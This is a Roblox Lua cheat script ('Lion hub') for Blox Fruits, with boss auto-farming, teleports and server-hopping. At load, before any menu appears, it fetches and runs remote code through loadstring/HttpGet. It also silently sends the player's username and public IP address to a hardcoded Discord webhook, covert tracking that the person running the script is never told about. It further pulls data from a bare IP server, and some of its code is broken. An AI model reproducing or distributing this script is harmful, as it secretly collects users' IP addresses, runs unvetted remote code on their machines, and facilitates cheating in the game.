_G.SelectWeapon = "Melee"
loadstring(game:HttpGet("https://raw.githubusercontent.com/khoanguyen-dev1/scriptnotify/refs/heads/main/fastattack.lua"))()

repeat wait() until game:IsLoaded()
if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end

game.StarterGui:SetCore("SendNotification", {
    Title = "Lion hub - Notify",
    Icon = "rbxassetid://123709024751036",
    Text = "Waiting load...",
    Duration = 5
})

function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    request({
        Url = Url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode(message)
    })
end

function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    return {
        ["embeds"] = {{
            ["title"] = "**Duck Hub**",
            ["type"] = "rich",
            ["color"] = randomColor,
            ["fields"] = {
                {
                    ["name"] = "**Username**",
                    ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                    ["inline"] = true
                },
                {
                    ["name"] = "**IP Address**",
                    ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                    ["inline"] = false
                },
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
        }}
    }
end

PostWebhook("https://discord.com/api/webhooks/1358380620862197830/1igzyRnsm9u1vFzCGMhN54fJVgVl3gc6UQG4Jtk3tvcWQ7qUwKPnQXtNf4L5WaEsW6DK", AdminLoggerMsg())

require(game.ReplicatedStorage.Util.CameraShaker):Stop()

local function checkAndKickPlayer()
    local player = game:GetService("Players").LocalPlayer
    local bannedHWID = ""
    if player.UserId == bannedHWID then
        player:Kick("Ngu")
    end
end

checkAndKickPlayer()

if not game:IsLoaded() then game.Loaded:Wait() end
local HttpService = game:GetService("HttpService")

-- Fluent UI
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local Window = Fluent:CreateWindow({
    Title = "Lion Hub",
    SubTitle = "By UwU ( Lion hub ) - khoanguyen0306#0",
    TabWidth = 110,
    Size = UDim2.fromOffset(480, 320),
    Acrylic = false,
    Theme = "Yellow",
    MinimizeKey = Enum.KeyCode.End
})

local Tabs = {
    Fullmoon = Window:AddTab({ Title = "Full Moon", Icon = "" }),
    mirage = Window:AddTab({ Title = "Mirage island", Icon = "" }),
    Bigmom = Window:AddTab({ Title = "Bigmom", Icon = "" }),
    Cursed = Window:AddTab({ Title = "Cursed captain", Icon = "" }),
    katav1 = Window:AddTab({ Title = "Cake Prince", Icon = "" }),
    BossCheck = Window:AddTab({ Title = "Boss Check", Icon = "" }),
    tp = Window:AddTab({ Title = "Teleport", Icon = "" }),
    set = Window:AddTab({ Title = "Setting", Icon = "" }),
}

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local ImageButton = Instance.new("ImageButton")
ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.12, 0, 0.095, 0)
ImageButton.Size = UDim2.new(0, 50, 0, 50)
ImageButton.Draggable = true
ImageButton.Image = "rbxthumb://type=GamePass&id=944258394&w=150&h=150"

local UICorner = Instance.new("UICorner", ImageButton)
UICorner.CornerRadius = UDim.new(0, 10)

ImageButton.MouseButton1Down:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.End, false, game)
end)

local function playSound()
    local sound = Instance.new("Sound", game:GetService("CoreGui"))
    sound.SoundId = "rbxassetid://130785805"
    sound.Volume = 10
    sound:Play()
end

playSound()


local function base64decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1,8 do c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local function xor_deobfuscate(data, key)
    local result = {}
    for i = 1, #data do
        local keyByte = key:byte((i - 1) % #key + 1)
        local dataByte = data:byte(i)
        table.insert(result, string.char(bit32.bxor(dataByte, keyByte)))
    end
    return table.concat(result)
end

local function getDeobfuscatedJobIds(apiUrl)
    local response = syn and syn.request or http and http.request or request
    local res = response({
        Url = apiUrl,
        Method = "GET"
    })

    local data = HttpService:JSONDecode(res.Body)
    local jobTable = data["jobId"]
    local result = {}
    local key = "lionsextoy"

    for obfKey, jobId in pairs(jobTable) do
        local b64 = string.split(obfKey, "_")[2]
        local decoded = base64decode(b64)
        local deobf = xor_deobfuscate(decoded, key)
        result[deobf] = jobId
    end

    return result
end

local function createJobButtons(tab, apiUrl, bossName)
    local jobList = getDeobfuscatedJobIds(apiUrl)
    local TeleportService = game:GetService("TeleportService")
    local LocalPlayer = game:GetService("Players").LocalPlayer

    for name, jobId in pairs(jobList) do
        tab:AddButton({
            Title = bossName,
            Description = "Job id: " .. name,
            Callback = function()
                TeleportService:TeleportToPlaceInstance(game.PlaceId, name, LocalPlayer)
            end
        })
    end
end

createJobButtons(Tabs.Fullmoon, "http://103.65.235.97:5000/fullmoon", "Full Moon")
createJobButtons(Tabs.mirage, "http://103.65.235.97:5000/mirage", "Mirage Island")
createJobButtons(Tabs.Bigmom, "http://103.65.235.97:5000/bigmom", "Bigmom")
createJobButtons(Tabs.Cursed, "http://103.65.235.97:5000/cursed", "Cursed Captain")
createJobButtons(Tabs.katav1, "http://103.65.235.97:5000/katav1", "Cake Prince")

game.StarterGui:SetCore("SendNotification", {
    Title = "Lion hub",
    Icon = "rbxassetid://123709024751036",
    Text = "Load Complete",
    Duration = 5
})
function topos(Pos)
    local Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    local Speed = 350  -- Default speed
    if Distance < 250 then
        Speed = 350
    elseif Distance >= 1000 then
        Speed = 350
    end

    local tween_s = game:GetService("TweenService")
    local info = TweenInfo.new(
        (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude / Speed,
        Enum.EasingStyle.Linear
    )
    local tween = tween_s:Create(
        game.Players.LocalPlayer.Character.HumanoidRootPart,
        info, 
        {CFrame = Pos}
    )
    tween:Play()
    tween.Completed:Wait()
end

function AutoHaki()
    if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buso")
    end
end

local meleeList = {
    "Combat", "Black Leg", "Electro", "Fishman Karate", "Dragon Claw",
    "Superhuman", "Death Step", "Sharkman Karate", "Electric Claw", 
    "Dragon Talon", "Godhuman", "Sanguine Art"
}

local function isMeleeWeapon(toolName)
    for _, name in ipairs(meleeList) do
        if toolName == name then
            return true
        end
    end
    return false
end

function EquipWeapon(ToolSe)
    if not ToolSe then return end
    if not isMeleeWeapon(ToolSe) then
        print("Tool " .. ToolSe .. " không phải melee weapon, bỏ qua!")
        return
    end

    local player = game.Players.LocalPlayer
    local backpack = player.Backpack
    local tool = backpack:FindFirstChild(ToolSe)
    if tool and player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid:EquipTool(tool)
        print("✅ Equipped melee:", ToolSe)
    end
end

task.spawn(function()
    while true do
        if _G.SelectWeapon == "Melee" then
            local player = game.Players.LocalPlayer
            local backpack = player.Backpack

            for _, tool in ipairs(backpack:GetChildren()) do
                if tool:IsA("Tool") and isMeleeWeapon(tool.Name) then
                    EquipWeapon(tool.Name)
                    break
                end
            end
        end
        task.wait(0.1) -- kiểm tra mỗi 1 giây
    end
end)

-- Check boss Sea 3
function CheckBoss(name)
    local targets = typeof(name) == "table" and name or {name}
    for _, v in pairs(game.ReplicatedStorage:GetChildren()) do
        if v:IsA("Model") and table.find(targets, v.Name) and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
            return v
        end
    end
    for _, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if v:IsA("Model") and table.find(targets, v.Name) and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
            return v
        end
    end
    return nil
end

function KillBoss(boss)
    local B = CheckBoss(boss)
    if B then
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")

        local platform = Instance.new("Part")
        platform.Size = Vector3.new(6, 1, 6)
        platform.Anchored = true
        platform.CanCollide = true
        platform.Material = Enum.Material.WoodPlanks
        platform.Transparency = 1
        platform.Name = "FlyingPlatform"

        -- Tạo platform ở vị trí cao trước khi tới boss
        local startPos = hrp.Position + Vector3.new(0, 20, 0)
        platform.CFrame = CFrame.new(startPos)
        platform.Parent = workspace

        wait(0.2) -- chờ một chút để đảm bảo nhân vật đã đứng yên

        repeat
            wait(0.1)
            pcall(function()
                EquipWeapon(_G.SelectWeapon)

                -- Bay tới boss từ platform
                topos(B.HumanoidRootPart.CFrame * CFrame.new(0, 20, 0))

                -- Cập nhật vị trí platform theo người chơi
                if platform and platform.Parent then
                    platform.CFrame = CFrame.new(hrp.Position.X, hrp.Position.Y - 3.5, hrp.Position.Z)
                end
            end)
        until not B.Parent or B.Humanoid.Health <= 0

        -- Xóa platform sau khi boss bị tiêu diệt
        if platform and platform.Parent then
            platform:Destroy()
        end
    else
        game.StarterGui:SetCore("SendNotification", {
            Title = "Lion Hub",
            Text = "Boss " .. boss .. " không có trong map!",
            Duration = 3
        })
    end
end


local bossListSea3 = {
    "Stone",
    "Hydra Leader",
    "Kilo Admiral",
    "Captain Elephant",
    "Longma",
    "Dough King",
    "Tyrant of the Skies",
    "Cake Prince",
    "Cake Queen"
}


local bossButtons = {} -- Lưu các button để xoá sau
local updatingBosses = false -- Đảm bảo không chạy trùng vòng lặp

local function clearBossButtons()
    for _, btn in ipairs(bossButtons) do
        pcall(function()
            btn:Destroy()
        end)
    end
    table.clear(bossButtons)
end

local bossButtons = {} -- Lưu các button theo tên boss
local updatingBosses = false

local function autoCheckBosses(tab)
    if not tab then 
        warn("BossCheck tab is nil!")
        return 
    end

    if updatingBosses then return end
    updatingBosses = true

    -- Tạo mỗi boss một button duy nhất
    for _, bossName in ipairs(bossListSea3) do
        local found = CheckBoss(bossName)
        local icon = found and "✅" or "❌"

        local button = tab:AddButton({
            Title = icon .. " " .. bossName,
            Description = found and "Boss có trong map - Click để đánh" or "Boss không có",
            Callback = function()
                local msg = found and ("Đang bay tới " .. bossName .. "...") or (bossName .. " không có trong map!")
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Lion Hub",
                    Text = msg,
                    Duration = 3
                })
                if found then
                    KillBoss(bossName)
                end
            end
        })

        bossButtons[bossName] = button
    end

    -- Cập nhật trạng thái icon và mô tả mỗi 10 giây
    while true do
        for _, bossName in ipairs(bossListSea3) do
            local found = CheckBoss(bossName)
            local icon = found and "✅" or "❌"
            local button = bossButtons[bossName]

            if button then
                pcall(function()
                    -- Cập nhật tiêu đề và mô tả nếu có thay đổi
                    button:SetTitle(icon .. " " .. bossName)
                    button:SetDescription(found and "Boss có trong map - Click để đánh" or "Boss không có")
                end)
            end
        end

        task.wait(10)
    end
end

autoCheckBosses(Tabs.BossCheck)

Tabs.tp:AddButton({
	Title = "Teleport Sea 1",
	Description = "faster teleport to old world with 1 click",
	Callback = function()            
		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelMain")
	end
})

Tabs.tp:AddButton({
	Title = "Teleport Sea 2",
	Description = "faster teleport to new world with 1 click",
	Callback = function()            
		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
	end
})
Tabs.tp:AddButton({
	Title = "Teleport Sea 3",
	Description = "faster teleport to third world with 1 click",
	Callback = function()            
		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelZou")
	end
})

local Mastery = Tabs.Tele:AddSection("Dịch Chuyển Đảo")

Tabs.tp:AddButton({
    Title = "🔍 Teleport to Mirage (Once)",
    Description = "Tìm và dịch chuyển đến Mirage Island nếu có",
    Callback = function()
        local found = false
        for _, island in pairs(game:GetService("Workspace")._WorldOrigin.Locations:GetChildren()) do
            if island.Name == "Mirage Island" then
                found = true
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Lion Hub",
                    Text = "Đang dịch chuyển đến Mirage Island...",
                    Duration = 3
                })
                -- Dịch chuyển người chơi
                topos(island.CFrame * CFrame.new(0, 333, 0))

                -- Kiểm tra nếu đảo Mirage có phần để gắn BillboardGui
                -- Mình giả sử đảo đó là một Model, ta sẽ gắn BillboardGui lên một PrimaryPart hoặc một Part có tên "Base" hoặc "Main"
                local targetPart = island.PrimaryPart or island:FindFirstChildWhichIsA("BasePart")
                if targetPart then
                    -- Tạo BillboardGui
                    local billboard = Instance.new("BillboardGui")
                    billboard.Name = "MirageLabel"
                    billboard.Adornee = targetPart
                    billboard.Size = UDim2.new(0, 100, 0, 50)
                    billboard.StudsOffset = Vector3.new(0, 5, 0)
                    billboard.AlwaysOnTop = true

                    local textLabel = Instance.new("TextLabel")
                    textLabel.Parent = billboard
                    textLabel.Size = UDim2.new(1, 0, 1, 0)
                    textLabel.BackgroundTransparency = 1
                    textLabel.Text = "Mirage"
                    textLabel.TextColor3 = Color3.fromRGB(255, 255, 0) -- màu vàng
                    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
                    textLabel.TextStrokeTransparency = 0
                    textLabel.Font = Enum.Font.SourceSansBold
                    textLabel.TextScaled = true

                    billboard.Parent = targetPart
                end

                return
            end
        end

        if not found then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Lion Hub",
                Text = "Không tìm thấy Mirage Island!",
                Duration = 3
            })
        end
    end
})

local Toggle = Tabs.tp:AddToggle("Dịch Chuyển Đến Đảo", {
    Title = "Dịch Chuyển Đến Đảo",
    Default = false
})
Toggle:OnChanged(function(Value)
	_G.BayDao = Value     
	if _G.BayDao == true then
		repeat wait()
			if _G.SelectIsland == "WindMill" then
				topos(CFrame.new(979.79895019531, 16.516613006592, 1429.0466308594))
			elseif _G.SelectIsland == "Marine" then
				topos(CFrame.new(-2566.4296875, 6.8556680679321, 2045.2561035156))
			elseif _G.SelectIsland == "Middle Town" then
				topos(CFrame.new(-690.33081054688, 15.09425163269, 1582.2380371094))
			elseif _G.SelectIsland == "Jungle" then
				topos(CFrame.new(-1612.7957763672, 36.852081298828, 149.12843322754))
			elseif _G.SelectIsland == "Pirate Village" then
				topos(CFrame.new(-1181.3093261719, 4.7514905929565, 3803.5456542969))
			elseif _G.SelectIsland == "Desert" then
				topos(CFrame.new(944.15789794922, 20.919729232788, 4373.3002929688))
			elseif _G.SelectIsland == "Snow Island" then
				topos(CFrame.new(1347.8067626953, 104.66806030273, -1319.7370605469))
			elseif _G.SelectIsland == "MarineFord" then
				topos(CFrame.new(-4914.8212890625, 50.963626861572, 4281.0278320313))
			elseif _G.SelectIsland == "Colosseum" then
				topos( CFrame.new(-1427.6203613281, 7.2881078720093, -2792.7722167969))
			elseif _G.SelectIsland == "Sky Island 1" then
				topos(CFrame.new(-4869.1025390625, 733.46051025391, -2667.0180664063))
			elseif _G.SelectIsland == "Sky Island 2" then  
				game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-4607.82275, 872.54248, -1667.55688))
			elseif _G.SelectIsland == "Sky Island 3" then
				game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-7894.6176757813, 5547.1416015625, -380.29119873047))
			elseif _G.SelectIsland == "Prison" then
				topos( CFrame.new(4875.330078125, 5.6519818305969, 734.85021972656))
			elseif _G.SelectIsland == "Magma Village" then
				topos(CFrame.new(-5247.7163085938, 12.883934020996, 8504.96875))
			elseif _G.SelectIsland == "Under Water Island" then
				game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
			elseif _G.SelectIsland == "Fountain City" then
				topos(CFrame.new(5127.1284179688, 59.501365661621, 4105.4458007813))
			elseif _G.SelectIsland == "Shank Room" then
				topos(CFrame.new(-1442.16553, 29.8788261, -28.3547478))
			elseif _G.SelectIsland == "Mob Island" then
				topos(CFrame.new(-2850.20068, 7.39224768, 5354.99268))
			elseif _G.SelectIsland == "The Cafe" then
				topos(CFrame.new(-380.47927856445, 77.220390319824, 255.82550048828))
			elseif _G.SelectIsland == "Frist Spot" then
				topos(CFrame.new(-11.311455726624, 29.276733398438, 2771.5224609375))
			elseif _G.SelectIsland == "Dark Area" then
				topos(CFrame.new(3780.0302734375, 22.652164459229, -3498.5859375))
			elseif _G.SelectIsland == "Flamingo Mansion" then
				topos(CFrame.new(-483.73370361328, 332.0383605957, 595.32708740234))
			elseif _G.SelectIsland == "Flamingo Room" then
				topos(CFrame.new(2284.4140625, 15.152037620544, 875.72534179688))
			elseif _G.SelectIsland == "Green Zone" then
				topos( CFrame.new(-2448.5300292969, 73.016105651855, -3210.6306152344))
			elseif _G.SelectIsland == "Factory" then
				topos(CFrame.new(424.12698364258, 211.16171264648, -427.54049682617))
			elseif _G.SelectIsland == "Colossuim" then
				topos( CFrame.new(-1503.6224365234, 219.7956237793, 1369.3101806641))
			elseif _G.SelectIsland == "Zombie Island" then
				topos(CFrame.new(-5622.033203125, 492.19604492188, -781.78552246094))
			elseif _G.SelectIsland == "Two Snow Mountain" then
				topos(CFrame.new(753.14288330078, 408.23559570313, -5274.6147460938))
			elseif _G.SelectIsland == "Punk Hazard" then
				topos(CFrame.new(-6127.654296875, 15.951762199402, -5040.2861328125))
			elseif _G.SelectIsland == "Cursed Ship" then
				game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
			elseif _G.SelectIsland == "Ice Castle" then
				topos(CFrame.new(6148.4116210938, 294.38687133789, -6741.1166992188))
			elseif _G.SelectIsland == "Forgotten Island" then
				topos(CFrame.new(-3032.7641601563, 317.89672851563, -10075.373046875))
			elseif _G.SelectIsland == "Ussop Island" then
				topos(CFrame.new(4816.8618164063, 8.4599885940552, 2863.8195800781))
			elseif _G.SelectIsland == "Mini Sky Island" then
				topos(CFrame.new(-288.74060058594, 49326.31640625, -35248.59375))
			elseif _G.SelectIsland == "Great Tree" then
				topos(CFrame.new(2681.2736816406, 1682.8092041016, -7190.9853515625))
			elseif _G.SelectIsland == "Castle On The Sea" then
				topos(CFrame.new(-4997.34082, 314.541351, -3015.64111))
			elseif _G.SelectIsland == "Port Town" then
				topos(CFrame.new(-290.7376708984375, 6.729952812194824, 5343.5537109375))
			elseif _G.SelectIsland == "Hydra Island" then
				topos(CFrame.new(5741.13281, 668.055969, -268.466827))
			elseif _G.SelectIsland == "Mansion" then
				topos(CFrame.new(-12550.4395, 337.194122, -7485.29004))
			elseif _G.SelectIsland == "Haunted Castle" then
				topos(CFrame.new(-9515.3720703125, 164.00624084473, 5786.0610351562))
			elseif _G.SelectIsland == "Ice Cream Island" then
				topos(CFrame.new(-902.56817626953, 79.93204498291, -10988.84765625))
			elseif _G.SelectIsland == "Peanut Island" then
				topos(CFrame.new(-2062.7475585938, 50.473892211914, -10232.568359375))
			elseif _G.SelectIsland == "Cake Island" then
				topos(CFrame.new(-1884.7747802734375, 19.327526092529297, -11666.8974609375))
			elseif _G.SelectIsland == "Cocoa Island" then
				topos(CFrame.new(87.94276428222656, 73.55451202392578, -12319.46484375))
			elseif _G.SelectIsland == "Candy Island" then
				topos(CFrame.new(-1014.4241943359375, 149.11068725585938, -14555.962890625))
			elseif _G.SelectIsland == "Tiki Outpost" then
				topos(CFrame.new(-16218.6826, 9.08636189, 445.618408))
			end
		until not _G.BayDao
	end
	StopTween(_G.BayDao)
end)

local Toggle = Tabs.set:AddToggle("Walk Water", { Title = "Walk Water", Default = true })
Toggle:OnChanged(function(Value)
	_G.NuocLon = Value
end)

spawn(function()
	while task.wait() do
		pcall(function()
			if _G.NuocLon then
				game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000,112,1000)
			else
				game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000,80,1000)
			end
		end)
	end
end)
AutoHaki()
